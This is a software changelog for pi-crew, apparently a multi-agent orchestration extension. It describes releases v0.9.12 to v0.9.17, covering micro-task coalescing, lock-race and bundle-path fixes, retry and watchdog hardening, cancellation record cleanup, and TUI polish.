# Changelog

## [v0.9.17] — coalesced micro-tasks (M6) ships + closeout race fix (2026-07-02)

Two end-to-end correctness fixes for the M6 real-dispatch path + one workload-sizing refinement, plus a startup-latency fix discovered during user testing.

### Highlights

- **M6 coalesced micro-tasks (real dispatch, MVP)**: 3-task smoke (`test-coalesce-static`) now produces real output files, populates `task.resultArtifact`, and writes heartbeats for all N group tasks so the background watcher doesn't emit false-positive `heartbeat_dead` alarms.
- **Closeout `run.lock` race fixed**: `executeTeamRun`'s catch path no longer re-acquires the run lock. The previous behavior caused `run.completed` to fire, then `run.failed` ~500ms later with `Run 'run.lock' is locked by another operation`. Symptom: spurious failed runs.
- **PI-CREW bundle path bug fixed (user-reported)**: `PROMPT_RUNTIME_EXTENSION_PATH` was computed via `import.meta.url-relative` resolution. In source it landed correctly at `<pi-crew>/src/prompt/prompt-runtime.ts`, but in the bundle esbuild's `__esm` helper does NOT preserve per-module `import.meta.url` — every module's `import.meta.url` resolves to the bundle's URL, so `dirname + "../"` landed at `<pi-crew>/` (missing `src/`). Replaced with `path.join(packageRoot(), 'src', 'prompt', 'prompt-runtime.ts')`. `packageRoot()` heuristically walks up to find pi-crew's `package.json` and works from both `src/` and `dist/` entries.
- **Adaptive group sizing** (M6 deferred #4): `planCoalescedGroups` now also caps by combined estimated prompt bytes (default 100KB heuristic) on top of the existing count cap. Prevents context-budget overflow on workflows with very long per-task instructions.

### Behavior changes

- **`coalesceMicroTasks` workflow frontmatter flag** (opt-in, default off) — now parsed and honored. See `.crew/workflows/test-coalesce-static.workflow.md` for usage.
- M6 dispatch now writes `task.resultArtifact` for all group tasks (single-task path was already doing this).
- M6 dispatch now writes heartbeats for all group tasks (15s interval while worker is in flight; cleared on completion). Heartbeat alert coercion — first-time-only emission per `(run, task)` — preserved.
- Catch path uses in-memory state instead of `withRunLock`-reloaded disk state. Trade-off documented: final-state inconsistency on partial closeout is preferable to spurious "run.lock locked" failures.

### Verification

| Gate | Result |
|---|---|
| TSC | ✅ |
| Lint | ✅ |
| format:check | ✅ |
| check:conflict-markers | ✅ |
| check:lazy-imports | ✅ |
| check:bundle-staleness | ✅ |
| Unit tests (npm test) | ✅ 30+ suites, all green on CI (Ubuntu/macOS/Windows) |
| Live E2E (test-coalesce-static) | ✅ 3/3 tasks with real output files + heartbeats on disk |

### Changed

- `src/runtime/pi-args.ts` — `PROMPT_RUNTIME_EXTENSION_PATH` uses `packageRoot()` heuristic instead of `import.meta.url-relative` path.
- `src/runtime/coalesce-tasks.ts` — `planCoalescedGroups` adds `maxGroupBytes` cap; greedy byte-budget chunking alongside the existing count cap.
- `src/runtime/run-coalesced-task-group.ts` — writes heartbeats for all N group tasks at dispatch and on a 15s interval while the worker is in flight (fixes false-positive `heartbeat_dead`).
- `src/runtime/team-runner.ts` — catch path no longer acquires `withRunLock`; uses in-memory state directly. Eliminates `run.lock` race against the closeout path.
- `src/workflow/...` — `coalesceMicroTasks` frontmatter field parsed from workflow YAMLs.
- `dist/index.mjs` — rebuilt; +1KB net (expanded lock-acquisition rationale comment + heartbeat init).

### Migration notes

- Workflow authors can now opt into micro-task coalescing via `coalesceMicroTasks: true` in workflow frontmatter. Default `false` — no behavior change for existing workflows.
- No public-API breaking changes. No new required configuration.
- Users on the strip-types fallback (`PI_CREW_USE_BUNDLE=0`) should rebuild the bundle once after upgrade if they want the fix: `npm run build:bundle`.

## [Unreleased] — bundle as default entry

The bundled entrypoint (`dist/index.mjs`, 2.9MB single file) is now the **default** load path. Strip-types loading remains as a fallback when `dist/` is missing (e.g. dev clone without `npm run build:bundle`) or when `PI_CREW_USE_BUNDLE=0` is set explicitly.

### Why default (vs opt-in)

Benchmarked with `scripts/bench-cold-start.mjs` (20 iters, fresh node processes each, **after the atomic-write fsync fix in `13f4490`**):

| Metric | Strip-types (p50) | Bundle (p50) | Delta |
|---|---|---|---|
| Total cold-start | 2509.4ms | 1716.6ms | **−31.6%** (bundle faster) |
| Import (`await import`) | 2322.1ms | 1543.1ms | **−33.5%** |
| Register (`registerPiTeams(mockPi)`) | 204.2ms | 157.8ms | **−22.7%** (bundle faster) |

After fsync, bundle is ~32% faster total cold-start. Bundle-flip risk is now bounded by a comprehensive safety net: `check-bundle-staleness` (CI gate, fails if src/ is newer than dist/), `check-conflict-markers` (CI gate, blocks bad merges), graceful fallback (silent if env unset, loud warning if PI_CREW_USE_BUNDLE=1 and bundle missing), and a separate bundle entry (`index.bundle.ts`) to avoid chicken-and-egg recursion. The cost (postinstall + ~9MB npm package) is paid automatically and silently for users who install via npm.

### Env var semantics

- unset / empty → use bundle if present, else strip-types
- `PI_CREW_USE_BUNDLE=0` / `false` / `no` / `off` → force strip-types, ignore bundle
- `PI_CREW_USE_BUNDLE=1` / `true` / `yes` / `on` → force bundle (same as unset when bundle is present; loud warning if bundle is missing)

### Changed

- `index.ts` — entrypoint now defaults to bundle, with strip-types as fallback when bundle is missing OR `PI_CREW_USE_BUNDLE=0`. Replaces the previous opt-in model (`ae01851`).
- `index.bundle.ts` (new) — minimal bundle entry. Bundled by `scripts/build-bundle.mjs` into `dist/index.mjs`. Separate from `index.ts` to avoid chicken-and-egg recursion (the bundle's `import.meta.url` is inside `dist/`, so building from `index.ts` would resolve `dist/index.mjs` relative to itself and try to load `dist/dist/index.mjs`).
- `scripts/build-bundle.mjs` — now bundles from `index.bundle.ts` (not `index.ts`).
- `package.json` — `postinstall` script retained (`build:bundle || warn`) so users get a working bundle out of the box. `files` includes `dist/` so opt-in/opt-out users get a working bundle after `npm install`.
- `scripts/check-bundle-staleness.mjs` (new) — CI gate that fails the build if any `src/*.ts` is newer than `dist/index.mjs`. Wired into `npm run ci`. No-op when `dist/` is absent.
- `scripts/check-conflict-markers.mjs` (new) — CI gate that scans tracked source for unresolved git merge markers (`<<<<<<<`, `=======`, `>>>>>>>`, `|||||||`). Excludes `test/unit/conflict-detect.test.ts` (intentional fixtures). Prevents recurrence of CI #28498831579 where unresolved stash/pop markers reached the bundle.
- `src/state/atomic-write.ts` — `atomicWriteFile` now calls `fs.fsyncSync(fd)` before close, and `fs.fsyncSync(dirFd)` on the parent directory after rename (Linux only). Fixes CI #28498831579 mailbox-replay flake on Ubuntu (page cache eviction under I/O pressure could cause read-after-write to see stale content).
- `src/utils/paths.ts` — `packageRoot()` now uses a heuristic walk to find the directory containing pi-crew's `package.json`. The original 2-level walk only worked for src/ paths; called from the bundle (1-level deep) it resolved to the wrong directory and broke team discovery.
- `scripts/bench-cold-start.mjs` (new) — reproducible cold-start benchmark. Run with `node scripts/bench-cold-start.mjs --iters 20`.
- `scripts/test-runner.mjs` — test step timeout bumped 600s → 900s to give Windows headroom for the fsync overhead (cost: ~5-10ms per atomic write across 5800+ tests).

## [v0.9.16] — cancel wipes the trace (2026-06-29)

User-driven refinement of the cancellation policy. Previously, cancelled / stopped subagents and crew-agent records were preserved on disk (`agent_*.json` files in `.crew/state/subagents/`, plus `agents.json` + per-task `status.json` in the run state directory) and continued to appear in the UI dashboard / widget / transcript viewer. The user explicitly asked: *"một khi đã cancel thì phải xóa luôn dấu vết về subagent đó chứ để lại làm gì nữa"* — once cancelled, the trace must be wiped. This release implements that policy.

### Changed — terminal-status deletion

- **Subagent records** (`.crew/state/subagents/<id>.json`) — added `removePersistedSubagentRecord(cwd, id)` in `src/runtime/subagent-manager.ts`. On terminal status `cancelled` / `stopped` / `terminated:true`, the persisted file is **deleted immediately** (no linger). The file is saved first so any concurrent reader sees the final status, then `unlink`'d within microseconds — the next widget/dashboard tick sees no entry.

- **Crew-agent records** (per-run `agents.json` index + per-task `status.json`) — added `removeCrewAgent(manifest, taskId)` in `src/runtime/crew-agent-records.ts`. `upsertCrewAgent()` now checks `shouldDeleteCrewAgentOnTerminalStatus(record)` and dispatches to `removeCrewAgent` instead of `saveCrewAgents` for `cancelled` / `stopped` records. Both the index entry AND the per-task status.json are wiped.

### What is preserved vs wiped

| Status | Persisted? | Rationale |
|---|---|---|
| `completed` | ✅ yes | Successful work — audit value |
| `failed` | ✅ yes | Agent errored — debugging value |
| `error` | ✅ yes | Unexpected exception — debugging value |
| `cancelled` | ❌ **wiped** | User-initiated cancellation — no trace |
| `stopped` | ❌ **wiped** | External abort — no trace |
| `terminated: true` (any status) | ❌ **wiped** | Any termination event — no trace |

### In-memory handles

`terminateLiveAgent` in `src/runtime/live-agent-manager.ts:169` already deletes from the `liveAgents` Map immediately after abort — no change needed. The `evictStaleLiveAgentHandles` fallback (10-min linger for orphan terminal handles) remains as a safety net.

### New helper predicates

- `shouldDeleteOnTerminalStatus(record)` — for `.crew/state/subagents/` records
- `shouldDeleteCrewAgentOnTerminalStatus(record)` — for per-run `agents.json` records

Both exported for downstream callers and tests.

### Tests

- **NEW `test/unit/cancellation-trace-wipe.test.ts`** — 15 cases covering:
  - `shouldDeleteOnTerminalStatus` / `shouldDeleteCrewAgentOnTerminalStatus` predicates for all 6 statuses
  - `removePersistedSubagentRecord` happy path + ENOENT safe-fail
  - `removeCrewAgent` removes from `agents.json` index AND per-task `status.json`
  - `upsertCrewAgent` integration: cancelled → wiped, completed/failed → preserved

- **Existing tests still pass** — 118/118 across 9 test files (subagent-manager-cov, subagent-tools-integration, live-manager-cov, direct-agent-run, team-runner-merge, process-lifecycle, preflight-validator, topology-analyzer, cancellation-trace-wipe). 0 regressions.

### Verification

- `tsc --noEmit` → EXIT 0
- `node scripts/check-lazy-imports.mjs` → "All dynamic imports have `// LAZY:` marker"
- `npm test` (focused 9-file suite) → 118/118 pass

### Honesty discipline

- **Failed subagents are NOT wiped** — they may carry useful debugging info (error stack, partial output). Different from cancel. If the user later wants failed→wipe too, it's a 1-line predicate change.
- **No tombstone** — the cancellation event is in `events.jsonl` (the run's audit log) and `notifications/`. Disk-level agent files are intentionally gone after cancel.
- **Filesystem race window** is microseconds (save then unlink); under heavy concurrent access a reader might briefly see the final status before the file disappears. Acceptable trade-off for the "no trace" policy.

### Files touched

| File | Change |
|---|---|
| `src/runtime/subagent-manager.ts` | +2 functions (`removePersistedSubagentRecord`, `shouldDeleteOnTerminalStatus`); modified `markStopped` + `runSubagent` finally block to wipe on cancel |
| `src/runtime/crew-agent-records.ts` | +2 functions (`removeCrewAgent`, `shouldDeleteCrewAgentOnTerminalStatus`); modified `upsertCrewAgent` to dispatch to remove on cancel |
| `test/unit/cancellation-trace-wipe.test.ts` | NEW (15 cases, 8.3 KB) |
| `CHANGELOG.md` | this entry |
| `package.json` | 0.9.15 → 0.9.16 |

## [v0.9.15] — workflow topology advisory (2026-06-29)

After a parallel-research assessment of v0.9.13 + v0.9.14 (`research-findings/pi-crew-performance-quality-assessment.md`, effectiveness evaluation at `.crew/research/pi-crew-effectiveness-evaluation.md`), a user-driven refinement showed that the original BLOCK-on-misuse design was too aggressive — **agents know their context better than the orchestrator**. This release ships an **advisory-only** topology classifier that prints measured-cost notes and proceeds either way. The agent (caller) decides.

Full rationale: `.crew/research/pi-crew-effectiveness-evaluation.md` §4.4 + the run-history evidence showing `fast-fix` (3-step sequential DAG) measured **5.7× slower and 1.9× costlier** than 3 raw `Agent` calls (`team_20260629092440_6b8538e31ba7616a`).

### Added — workflow topology advisory

- **New `src/workflows/topology-analyzer.ts`** — pure classifier that parses a `WorkflowConfig`, builds the DAG (Kahn-style longest-path depth), detects `parallelGroup:` declarations, and returns `{topology, stepCount, parallelGroupCount, fanOutDegree, dagDepth, recommendation, reason}`. Topologies: `single` (1 step, no concurrency), `sequential` (linear chain, no parallelGroup), `concurrent` (≥3 truly parallel agents via `parallelGroup`), `complex-dag` (4+ steps with branching — `≥2 deps` on ≥1 node), `dynamic` (`.dwf.ts` script). Honors explicit `topology:` frontmatter override when present.

- **New `src/workflows/preflight-validator.ts`** — applies the topology rule from `.crew/knowledge.md` "pi-crew USAGE THRESHOLD RULE" (CONVENTIONS section). Returns `{level: "info" | "note" | "warn", message, suggestion, topology, stepCount, recommendation}`. **Never blocks.** Three severity levels:
  - `info` — context-only (dynamic workflow, `force:true` acknowledged)
  - `note` — validated use case (concurrent / complex-dag); "✅ proceeding"
  - `warn` — potential inefficiency (single / sequential 2-3 / 4+); measured cost evidence + "Proceeding anyway"

- **Top-level integration** (`src/extension/team-tool/run.ts`, called BEFORE `executeTeamRun`):
  - Extension-layer guard logs the advisory via `console.warn` with icon (`⚠️ ` / `✅ ` / `ℹ️  `) and continues the run.
  - Defense-in-depth in `src/runtime/team-runner.ts:447-468` also logs (catches direct API callers — CLI, tests, scheduler — that bypass the extension layer).
  - Both layers **never throw / never short-circuit**. The agent is always in charge.

### Changed — agent awareness surfaces

- **`team` tool description** (`src/extension/registration/team-tool.ts`) now includes an explicit "ℹ️ ADVISORY NOTE (preflight, never blocks)" paragraph + 4 case-by-case notes. Agents reading the tool definition see the rule BEFORE deciding to call.
- **`team` prompt snippet** shortened and re-toned: "Use the team tool for multi-agent orchestration when you need ≥3 concurrent agents or a complex DAG. For single tasks or 2–3 sequential steps, the raw Agent tool is usually faster. **pi-crew notes the topology (informational only) but proceeds either way — you decide.**"
- **Workflow YAML frontmatter** — 8 builtin workflows now declare `topology:` (`single` / `sequential` / `concurrent` / `complex-dag` / `dynamic`) so the analyzer honors explicit classification when present and falls back to auto-detection when absent. New `WorkflowConfig.topology?` field in `src/workflows/workflow-config.ts`. `src/workflows/discover-workflows.ts:parseWorkflowFile` parses the field; invalid values are silently dropped (fall-through to auto).

### Tests

- **`test/unit/topology-analyzer.test.ts`** — 13 cases: each topology + `parallelGroupsFromSteps`, `fanOutDegreeFromSteps`, `dagDepthFromSteps` helpers + edge cases (empty deps, unknown deps, defensive cycle handling).
- **`test/unit/preflight-validator.test.ts`** — 11 cases: each topology × level combo, force-bypass acknowledgement, all-3-severities-reachable check, "validator never throws" contract.
- `test/unit/direct-agent-run.test.ts` + `test/unit/team-runner-merge.test.ts` — re-verified to ensure defense-in-depth guard does not break synthetic-1-step direct-agent runs (skip condition: `workflow.filePath === "<generated>"`).

### Verification

- `tsc --noEmit` → EXIT 0 (no type errors)
- `test:unit` → 5800+ tests, 0 fail attributable to this change (1 pre-existing env-related fail on `resolveNpmGlobalRoot` is unrelated and pre-dates this release)
- Live smoke test (`/tmp/preflight-smoke.ts`): all 6 topology cases emit the expected advisory level — `single` → WARN, `sequential 2/3/4` → WARN with measured-cost evidence, `concurrent` → NOTE, `force:true` → INFO
- Live integration test (`team_20260629152312_ca139c8540e938a1`): ran a 3-step sequential `fast-fix` workflow; advisory note appeared in console, workflow completed normally (no block), agent independently verified the rule via source + smoke test + unit tests

### Honesty discipline

- **No BLOCK** — the original v0.9.15 design had `level: "block"` that hard-rejected single-task runs; user feedback refined this to advisory-only after observing that the orchestrator doesn't know the agent's full context (audit needs, team coordination reasons, etc.). The agent is in charge.
- **`force:true`** parameter still works (acknowledged as `info` level) but is no longer required — runs always proceed.

### Files touched

| File | Change |
|---|---|
| `src/workflows/topology-analyzer.ts` | NEW (182 LOC) |
| `src/workflows/preflight-validator.ts` | NEW (177 LOC) |
| `src/workflows/workflow-config.ts` | +8 LOC (topology? field) |
| `src/workflows/discover-workflows.ts` | +12 LOC (parse frontmatter.topology + parseTopology helper) |
| `src/extension/team-tool/run.ts` | +18 LOC (extension-layer advisory log) |
| `src/runtime/team-runner.ts` | +18 LOC (defense-in-depth advisory log) |
| `src/extension/registration/team-tool.ts` | ~30 LOC (tool description + prompt snippet re-toned) |
| `src/config/types.ts` | +5 LOC (CrewReliabilityConfig.forcePreflight? field — reserved, currently unused) |
| `workflows/*.workflow.md` (8 files) | +1 line each (topology: frontmatter) |
| `test/unit/topology-analyzer.test.ts` | NEW (181 LOC, 13 cases) |
| `test/unit/preflight-validator.test.ts` | NEW (163 LOC, 11 cases) |
| `README.md` | +75 LOC ("Workflow topology advisory" section) |
| `CHANGELOG.md` | this entry |

## [v0.9.14] — reliability & UX fixes from the v0.9.13 performance/quality assessment (2026-06-29)

A parallel-research assessment of v0.9.13 measured three operational gaps and produced ten prioritized recommendations (effort × impact). This release ships **8 of 10 fixes + 2 UX bug fixes from bug reports**, with the remaining 2 honestly deferred (need product input). The unifying theme: **stop the silent lies** — retry that was built but never enabled, a "completed" status that hid zero work, and UI that read failed runs as still-running.

Full assessment: `research-findings/pi-crew-performance-quality-assessment.md`. Completion ledger: `research-findings/fix-all-completion-status.md`.

### Bug fixes — reliability (assessment recs #1–#10)

- **#1 autoRetry enabled by default (opt-out) [HIGH impact]** — the entire retry + recovery stack was built and tested but gated off (`team-runner.ts:688`: `if (autoRetry !== true) return single-shot`). Every task got exactly ONE attempt. The dominant v0.9.13 failure was `ChildTimeout` ("worker became unresponsive") — 78 event-log occurrences, 13 run-level failures — all with zero retries. Now opt-OUT: new `shouldUseRetry()` helper (`reliability.autoRetry !== false`); `isRetryable()` already returns true on the default policy, so transient hangs retry up to `maxAttempts` (3) with exponential backoff. The single highest-impact fix — flip one gate.

- **#2 goal-achievement detection — kills the silent false-green** — run `team_20260626170635` reported terminal-success while its verifier wrote "did NOT apply ANY of the three security fixes. `git diff --stat` empty. Tests green only because nothing was changed." New `goal-achievement.ts` (pure functions, unit-tested): a code-mutating workflow (executor/test-engineer steps) in a git repo whose working tree is CLEAN after "completion" is the false-green signature. Read-only/doc workflows and non-git cwds are never accused (conservative). `manifest.goalAchieved` + `goalAchievementNote` + a `run.goal_achievement` event are emitted always; status is downgraded `completed` → `failed` ONLY when a corroborating failed-task signal confirms it (a legitimately-no-op mutating run is flagged but not broken).

- **#4 recovery `rerun_task` execution (was decorative)** — `buildRecoveryLedger` recorded `rerun_task` entries with `state:"planned"` but NOTHING ever executed them. The run loop aborted on the first failed task. New `shouldRerunFailedTask()` (pure fn) drives a bounded whole-task re-queue in the run loop when `limits.maxRetriesPerTask > 0` and `retryCount < max`. Default-off (preserves behavior); bounded by `retryCount >= max` (no infinite loop). Complements #1 (autoRetry handles retryable throws within `executeWithRetry`; #4 handles terminal FAILED status re-queue).

- **#3 unresponsive-worker hardening [confounded — labeled "hardened" not "fixed"]** — the 78 `ChildTimeout` occurrences are confounded by the free model (`zai/glm-5.2`, `cost=0` everywhere in sampled runs); cannot be root-caused without a paid model. Applied defensive hardening anyway: `maxCaptureBytes` 256 KB → 512 KB (critical diagnostic stderr less likely truncated during hang analysis), SIGKILL escalation on timeout (kill-tree after grace) + a safety-settle timer so a hung worker cannot hold the run forever.

- **#5 stop redacting token counts in `events.jsonl`** — usage/cost fields were obscured as `"***"`, blocking token analysis off the event stream. New `TOKEN_COUNT_KEYS` exclusion in `redaction.ts` un-redacts token/cost COUNTS while keeping API-key secrets redacted. Restores observability.

- **#7 intermediate-findings capture (over-budget workers)** — a worker that spends its whole budget on tool calls (13 calls) may never emit a final structured handoff → `results/<id>.txt` = one fragment line → `valid:false`. This happened to the `explore-ui` shard of THIS release's assessment. `ChildPiLineObserver` now tracks `intermediateFindings` (best assistant text seen), and `task-runner`'s result chain falls back to it when no clean `rawFinalText` is produced — the result is never a useless 1-line fragment. Does NOT regress Fix A (rawFinalText, v0.9.13): rawFinalText stays preferred; intermediateFindings is a deeper fallback.

- **#10 version drift** — `BUILT_AGAINST_PI_VERSION` ("0.79.3") did not match the installed `pi-coding-agent` ("0.77.0"). Reconciled; a new test reads `node_modules` at test time and asserts the match, so drift is caught going forward.

### Bug fixes — UX (bug reports)

- **bug-021 notification badge** — the `🔔N` bell glyph in the crew widget header / powerbar was misread as "queued messages": users saw `🔔227` and concluded 227 pending items, when the value is a CUMULATIVE warning/error/critical count with zero actual queue behind it (verified: 0 queued agents, 0 queued tasks, 0 unread mailbox). `notificationBadge()` now renders `· N alerts` (explicit label, no bell) and caps the display at `99+` (standard badge practice). The cumulative count stays accurate internally and remains fully logged in `.crew/state/notifications/`; this bounds presentation only. Deeper fixes (decay window, owner-scope, auto-reset, full deprecation) remain open product decisions — documented in `docs/bugs/bug-021-notification-badge-counter-misleading.md`.

- **bug-022 terminal-run widget row** — for terminal runs (failed/cancelled/completed), the run-progress row computed `runElapsedMs = Date.now() - run.createdAt` for EVERY run, so a failed run lingering in the F-5 grace window showed an ever-climbing counter (e.g. `2028s` and rising), read as "still running". The `✘` glyph + `0/1 agents` layout reinforced the misread. Now: the timer FREEZES at `run.updatedAt` (when the run reached terminal status) and an explicit ` · <status>` label is appended. Running runs keep the live ticker. Verified live: a completed fast-fix run renders `✓ fast-fix/fast-fix · 3/3 agents · 513s · completed` with a stable, non-climbing counter.

### Tests

- **#9 real-process watchdog E2E** — `background-runner-watchdog.test.ts` was logic-only (admitted in its header); the real-process kill path was only manually verified. New `background-runner-watchdog-e2e.test.ts` spawns a hung harness with `PI_CREW_MAX_RUN_MS` overridden short, asserts the process dies within the grace window, and uses the `PI_CREW_PARENT_PID=test.pid` no-leak pattern so the test never leaks a runner.

- **team-tool-parallel process leak** — test case 5 passed validation and reached `spawnBackgroundTeamRun`, spawning a REAL detached background-runner on every `npm test`. Rewritten to use a non-existent agent (returns an agent-not-found error BEFORE spawn) + `PI_CREW_PARENT_PID` defense-in-depth.

### Honesty discipline

- **Anti-overclaim verification** — the fix-all implementation run's verifier FAILED honestly: only 2/10 were committed by the worker team, 7 incomplete. The leader (this session) then implemented #1/#2/#4 surgically, committed the uncommitted #3/#7/#9, and deferred #6/#8 with documented rationale. Pre-existing flaky `goal-loop-smoke.test.ts` was PROVEN independent (fails identically at baseline `aff3fd5`). MEASURED vs INFERRED separated throughout.

### Deferred (need product input)

- **#6 retained chain + research E2E** — `scripts/run-real-chain.ts` needs a REAL model run; the free model hangs (the assessment's core confound). Chain feature is statically verified (86/86 unit tests). Live E2E pending paid-model access.
- **#8 split `register.ts`** (2194 LOC) — already a thin orchestrator calling ~30 extracted `registerXxx()` functions; split = cosmetic churn with regression risk for marginal gain. Not worth it.

### Verification

- `tsc --noEmit` → EXIT 0
- `check:lazy-imports` → EXIT 0
- `test:unit` → 5742 tests, 5739 pass, 0 fail (3 skipped), EXIT 0
- `test:integration` → 157/157 pass excluding pre-existing-flaky `goal-loop-smoke` (proven fails identically at baseline)
- new-fix tests → 67/67 pass (#1/#2/#4/#5/#7/#9/#10 + bug-021/022)
- `npm pack --dry-run` → 631 files, clean

## [v0.9.13] — chain feature + raw worker output + anti-zombie hardening (2026-06-29)

Context/compaction efficiency work + a live `chain` feature that wires previously-dead code, plus two root-cause zombie fixes. The unifying theme: **deliver the right context efficiently and never leave orphaned state behind.**

### Features

- **Section-aware knowledge injection** (`knowledge-injection.ts`) — `.crew/knowledge.md` is no longer injected as a uniform head-only block. CONVENTIONS sections (always-relevant: Code Style, Environment, Architecture, Testing, Release Process) are injected in full; SESSION-LOG sections (per-version post-mortems, incidents) are IDF-scored against the task/goal and budget-capped (5 KB), drop-whole with a head-slice fallback and a section-index recovery net. Cuts knowledge-token waste for trivial tasks (a `team action='run'` with a trivial goal went from ~4 000 tokens of mostly-irrelevant session-log noise to ~2 095 tokens of conventions + matching session-log) without starving architecture-relevant tasks. Backward compatible: `readKnowledge(cwd)` with no query keeps the legacy head-only path. Verified live (post-restart research run): worker knowledge dropped from ~4 000 tokens (95 % session-log noise) to ~2 095 tokens, with the synthesized Architecture reference present.

- **Live `chain` feature** (`team action='run', chain='"a" -> "b" -> "c"'`) — `ChainRunner` was complete and unit-tested but had ZERO production callers. Each step now runs a REAL team run via an injected `handleRun`, with handoff context (including the previous step's output text) passed forward through a `# Previous Steps in This Chain` block prepended to the step's goal. This also makes `enrichContextFromHandoffs`'s honesty markers (`__chainHistoryNotes`) reachable in production. See `src/extension/team-tool/{chain-dispatch,chain-executor}.ts`.

### Bug fixes

- **Raw worker result + dependency-context tee recovery (output)** — `results/<id>.txt` was 16 K-capped at child-pi stream-parse time (`compactContentPart` caps assistant text at `MAX_ASSISTANT_TEXT_CHARS`), and the dependency-context path re-read the same capped text circularly (no tee, unlike sharedReads). Now: (a) `ChildPiLineObserver` captures the RAW final assistant text before the transcript's compaction, and `task-runner` writes it as the authoritative `results/<id>.txt` (monotonic-safe fallback to transcript-derived `finalText`); the transcript stays 16 K-capped (telemetry memory bound unchanged). (b) `collectDependencyOutputContext` now uses `readIfSmallWithTee` (matching sharedReads) and `renderDependencyOutputContext` surfaces the `Full output (if you need the missing middle): <path>` hint, breaking the circular re-read. Verified live: a research run's analyst result went from a 16 K-capped file with a `[pi-crew compacted N chars]` marker to a 33 KB RAW file with zero data-loss markers; the downstream writer received 33 K of raw dependency context. Tracing in `research-findings/output-handling-deep-dive.md`.

- **Truncated-content recovery hints** — truncation markers in knowledge (`knowledge-injection.ts`), agent memory (`agent-memory.ts`), and dependency output now embed the absolute path + a `read`-tool hint so workers can recover the dropped tail instead of silently losing it. Tee threshold lowered 2× → 1.25× (`TEE_THRESHOLD_MULTIPLIER`) so the 32–64 KB band gets a recovery path. Live-session system prompt no longer duplicates the MEMORY block (it was already injected via `renderTaskPrompt().full`).

- **background-runner watchdog (anti-zombie processes)** — the keepAlive interval (`setInterval(()=>{}, 5000)`, no `unref`) cleared only in `runCleanup`, so a hung team run (stuck child Pi, deadlocked lock, or a test that spawns a run without cleanup) left the process alive indefinitely. The existing parent-guard only fires when the parent DIES; here the parent hung too, so it never fired. Fix: a watchdog timer alongside keepAlive aborts via the shared `AbortController` (propagates → child-pi → kills child processes) and force-exits after a 15 s grace if the abort does not propagate. Default 2 h (generous for legitimate long runs); override via `PI_CREW_MAX_RUN_MS`. Verified live: normal run exits cleanly (watchdog cleared, 0 `watchdog_fired` events); isolated hang fires at exactly `MAX` ms.

- **Test state isolation (anti-zombie UI rows)** — `useProjectState(cwd)` returns `findRepoRoot(cwd) !== undefined`, and `scopeBaseRoot` falls back to the EXTENSION-GLOBAL state dir (`~/.pi/agent/extensions/pi-crew/state/runs/`) when cwd is NOT a git repo. Tests that create a tmpdir WITHOUT `git init` and call `createRunManifest`/`writeRunFixture`/`createRunPaths` were leaking run records into that global dir — the one the crew widget reads — creating persistent fake-agent rows after every test run. Fix: the shared `createTrackedTempDir` helper and `state-store.test.ts`'s `makeResolvedTempDir` now create a `.git` marker dir so records land in `<tmpdir>/.crew/` (auto-cleaned). Protects all current and future callers. Verified: state-store + cov + chain-executor tests left global state 2 → 2 (zero leak).

### Docs

- **README** — removed 182 lines of version-by-version highlights (v0.9.0 → v0.9.12, v0.8.x, v0.7.0) that duplicated CHANGELOG.md. README now flows intro → `## Features` straight. Version tags remain only where they qualify a feature (e.g. `(L4, v0.9.8)`) — useful for deciding whether to upgrade.

### Stats

29 files changed · ~2 498 insertions / ~189 deletions across 7 commits.

### Verification

- `npx tsc --noEmit`: clean.
- 44/44 new + modified unit tests pass (`raw-final-text`, `dependency-tee`, `chain-executor`, `chain-handoff-markers`, `background-runner-watchdog`).
- Live (post-restart): chain 2-step run produced enriched step-2 goal with step 1's output; raw worker result verified end-to-end (33 KB analyst result, 0 markers); watchdog verified on normal path (clean exit) + hang path (fires at MAX ms).

## [v0.9.12] — TUI UI/UX polish (21 findings) (2026-06-27)

Comprehensive TUI UX review of pi-crew's UI layer (`src/ui/` + `src/utils/visual.ts`). 21 findings (5×P1, 10×P2, 6×P3), all addressed. Full review with evidence-backed file:line citations: `research-findings/pi-crew-uiux-review.md`.

### Bug fixes

- **F-3 (P1)** — `src/ui/live-conversation-overlay.ts`: local `pad` used `s.length` (counted ANSI escape bytes) and `content.slice` (UTF-16 units) → border drift on every colored or CJK line. Replaced with `pad`/`truncate` from `utils/visual.ts` (reference impl: `transcript-viewer.ts`).
- **F-1 / F-2 / V-3 (P1/P2)** — `src/ui/status-colors.ts` (new shared `colorizeStatusGlyphs()`): unified status-glyph colorization covers ⏳ (waiting), ⚠ (needs_attention), and the braille spinner range ⠁–⣿ — the two most attention-demanding states were previously uncolored. Replaces duplicated per-module glyph maps/regexes in `widget-renderer.ts`, `live-run-sidebar.ts`, and `run-dashboard.ts`.
- **L-1 (P1)** — `src/ui/run-dashboard.ts`: windowed run list with `scrollOffset`; selection can no longer escape the rendered 8-row window. ↓ past row 7 previously hid the highlight and Enter acted on an invisible run. Brute-force verified for 0–30 runs.
- **L-2 (P1)** — cancellation/failure reason now shown in default detail row (`run-dashboard.ts`) and `live-run-sidebar.ts`. Previously rendered only in `progress-pane` (pane `2`). `cancellation-pane.ts` wired in via `summarizeTerminalReason()` (D-1).
- **V-1 (P2)** — tabular-aligned numeric metrics across `run-dashboard` footer, `dashboard-panes/agents-pane.ts`, and `widget/widget-formatters.ts` via width-aware `alignMetric` (visibleWidth-based). Eliminates per-tick column jitter on transitions like 9.9s→10.0s and 950→1.0k.
- **F-5 (P2)** — `src/runtime/process-status.ts`: `ERROR_VISIBILITY_GRACE_MS = 10 * 60_000` (was the 8s `COMPLETED_VISIBILITY_GRACE_MS` shared with completed runs). Failed/cancelled runs now linger 10 min in the crew widget — the run-level header (✗ team/workflow · X/Y agents) is the "one-line trace". Successful completions still vanish in 8s.
- **K-1 (P2)** — new `src/ui/overlays/help-overlay.ts`: `?` opens the HelpOverlay rendering `BINDINGS[]` grouped by scope. ~16/20 keybindings were previously undiscoverable (no `?` cheatsheet existed). Header hint updated.
- **F-6 (P2)** — `src/ui/live-run-sidebar.ts`: auto-close countdown moved inside the bordered box (was rendered below the bottom border).
- **V-2 (P2)** — `src/ui/crew-footer.ts`, `src/ui/crew-select-list.ts`: dropped ASCII `'...'` 3rd arg from `truncate(...)` so they use the default `'…'` (U+2026) consistently with the rest of the UI. Test updated.
- **L-3 / L-4 / L-5 (P2/P3)** — width-aware `runLabel` keeps the goal visible (the most meaningful field); widget prioritizes running > queued > waiting with `finishedSlots` so finished rows only fill leftover budget and never push a live agent's activity line off-screen; run-list separator unified to ` · `.
